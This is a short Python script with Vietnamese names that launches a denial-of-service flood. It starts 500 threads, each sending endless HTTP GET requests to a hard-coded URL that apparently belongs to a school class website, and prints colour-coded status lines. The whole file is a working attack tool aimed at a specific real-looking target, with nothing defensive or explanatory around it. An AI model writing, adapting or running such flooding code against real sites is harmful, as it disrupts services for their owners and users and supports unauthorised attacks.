import requests
import threading

# Màu sắc cho console
XANH = '\033[1;32m'
DO = '\033[1;31m'
VANG = '\033[1;33m'

def gui_yeu_cau(url):
    try:
        phan_hoi = requests.get(url)
        if phan_hoi.status_code == 200:
            print(f"{XANH}Gửi yêu cầu đến {url}, Mã trạng thái: 200")
        else:
            print(f"{DO}Lỗi khi gửi yêu cầu đến {url}")
    except requests.RequestException as loi:
        print(f"{VANG}Lỗi khi gửi yêu cầu đến {url}: {loi}")

def tan_cong(url):
    while True:
        gui_yeu_cau(url)

if __name__ == "__main__":
    dia_chi_url = 'https://tranglop10a6.rf.gd/trangghibai.html?i=2'
    so_luong_luong = 500
    danh_sach_luong = []

    for i in range(so_luong_luong):
        luong = threading.Thread(target=tan_cong, args=(dia_chi_url,))
        luong.start()
        danh_sach_luong.append(luong)

    for luong in danh_sach_luong:
        luong.join()